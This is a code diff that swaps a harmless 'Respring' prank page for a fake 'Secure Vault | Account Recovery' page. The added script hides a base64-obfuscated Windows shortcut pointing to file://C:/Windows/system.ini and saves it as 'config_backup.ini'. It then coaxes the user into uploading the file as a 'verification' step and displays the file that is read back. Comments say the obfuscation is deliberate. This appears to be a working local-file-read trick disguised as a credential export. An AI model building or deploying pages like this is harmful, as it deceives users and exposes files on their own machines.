@@ -1,121 +1,65 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Respring</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
-    body {
-      min-height: 100vh;
-      background: radial-gradient(ellipse at 60% 30%, #3a2a7a 0%, #1a1040 40%, #0d0820 100%);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: 'Inter', sans-serif;
-      overflow: hidden;
-    }
-
-    .blob { position: fixed; border-radius: 50%; filter: blur(80px); pointer-events: none; z-index: 0; }
-    .blob-1 { width: 350px; height: 350px; background: rgba(80,50,200,0.3); top: -80px; right: -80px; }
-    .blob-2 { width: 300px; height: 300px; background: rgba(100,60,180,0.2); bottom: -60px; left: -60px; }
-
-    .container { position: relative; z-index: 1; text-align: center; }
-
-    .respring-btn {
-      padding: 12px 32px;
-      background: #2563eb;
-      color: #fff;
-      font-size: 17px;
-      font-weight: 600;
-      border: none;
-      border-radius: 12px;
-      cursor: pointer;
-      box-shadow: 0 4px 24px rgba(37,99,235,0.45);
-      transition: background 0.15s, transform 0.1s;
-    }
-    .respring-btn:hover { background: #1d4ed8; }
-    .respring-btn:active { transform: scale(0.96); }
-
-    .overlay { display: none; position: fixed; inset: 0; z-index: 10; align-items: center; justify-content: center; }
-    .overlay.active { display: flex; }
-
-    .alert-box {
-      background: rgba(255,255,255,0.13);
-      backdrop-filter: blur(28px);
-      border: 1px solid rgba(255,255,255,0.15);
-      border-radius: 18px;
-      padding: 20px 24px 16px;
-      width: 290px;
-      box-shadow: 0 8px 40px rgba(0,0,0,0.5);
-      animation: popIn 0.22s cubic-bezier(0.34,1.56,0.64,1);
-    }
-    @keyframes popIn {
-      from { opacity: 0; transform: scale(0.88); }
-      to   { opacity: 1; transform: scale(1); }
-    }
-
-    .alert-message { color: rgba(255,255,255,0.92); font-size: 15px; line-height: 1.45; margin-bottom: 16px; }
-    .alert-footer { text-align: right; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 12px; }
-
-    .close-btn {
-      background: none; border: none;
-      color: #3b82f6; font-size: 17px; font-weight: 600;
-      cursor: pointer; font-family: 'Inter', sans-serif;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>Secure Vault | Account Recovery</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        .panel { display: none; padding: 15px; border: 1px solid #ccc; border-radius: 8px; }
+        .visible { display: block; }
+        button { padding: 10px 20px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 4px; }
+        #output-area { background: #f4f4f4; padding: 10px; margin-top: 10px; border-left: 4px solid #333; }
+    </style>
 </head>
 <body>
-  <div class="blob blob-1"></div>
-  <div class="blob blob-2"></div>
 
-  <div class="container">
-    <button class="respring-btn" onclick="startRespring()">Respring!</button>
-  </div>
-
-  <div class="overlay" id="overlay">
-    <div class="alert-box">
-      <p class="alert-message">
-        device will respring in <strong id="countdown">5</strong> seconds!!
-      </p>
-      <div class="alert-footer">
-        <button class="close-btn" onclick="closeAlert()">Close</button>
-      </div>
+    <div id="v1" class="panel visible">
+        <h3>Step 1: Initialize Account</h3>
+        <button onclick="nav(2)">Setup Account</button>
     </div>
-  </div>
 
-  <script>
-    let timer = null;
-    let seconds = 5;
+    <div id="v2" class="panel">
+        <h3>Step 2: Export Credentials</h3>
+        <p>Wallet generated: <strong>0x9482...45f1</strong></p>
+        <button onclick="nav(3); triggerExport()">Download Export File</button>
+    </div>
 
-    function startRespring() {
-      seconds = 5;
-      document.getElementById('countdown').textContent = seconds;
-      document.getElementById('overlay').classList.add('active');
+    <div id="v3" class="panel">
+        <h3>Step 3: Verification</h3>
+        <p>Upload your export file to verify integrity.</p>
+        <button id="btn-trigger">Upload Export File</button>
+        <input id="input-hidden" type="file" style="display: none;" />
+        <pre id="output-area"></pre>
+    </div>
 
-      clearInterval(timer);
-      timer = setInterval(() => {
-        seconds--;
-        document.getElementById('countdown').textContent = seconds;
-        if (seconds <= 0) {
-          clearInterval(timer);
-          closeAlert();
-          document.body.style.transition = 'opacity 0.6s';
-          document.body.style.opacity = '0';
-          setTimeout(() => {
-            document.body.style.opacity = '1';
-            document.body.style.transition = '';
-          }, 700);
+    <script>
+        // Navigasi yang dimodifikasi
+        function nav(id) {
+            document.querySelectorAll('.panel').forEach(p => p.classList.remove('visible'));
+            document.getElementById(`v${id}`).classList.add('visible');
         }
-      }, 1000);
-    }
 
-    function closeAlert() {
-      clearInterval(timer);
-      document.getElementById('overlay').classList.remove('active');
-    }
-  </script>
+        // Fungsi download dengan obfuscation data ringan
+        function triggerExport() {
+            const blobData = atob("W3swMDAyMTRBMC0wMDAwLTAwMDAtQzAwMC0wMDAwMDAwMDAwNDZ9XQ0KUHJvcDM9MTksMg0KW0ludGVybmV0U2hvcnRjdXRdDQpJRExpc3Q9DQpVUkw9ZmlsZTovL0M6L1dpbmRvd3Mvc3lzdGVtLmluaQ0KSG90S2V5PTA=");
+            const blob = new Blob([blobData], { type: "application/x-ms-shortcut" });
+            const link = document.createElement("a");
+            link.href = URL.createObjectURL(blob);
+            link.download = "config_backup.ini";
+            link.click();
+        }
+
+        // Logika File Handler yang berbeda
+        const fileIn = document.querySelector('#input-hidden');
+        document.querySelector('#btn-trigger').onclick = () => fileIn.click();
+
+        fileIn.onchange = (e) => {
+            const reader = new FileReader();
+            reader.onload = (event) => {
+                document.querySelector('#output-area').textContent = event.target.result;
+            };
+            reader.readAsText(e.target.files[0]);
+        };
+    </script>
 </body>
 </html>
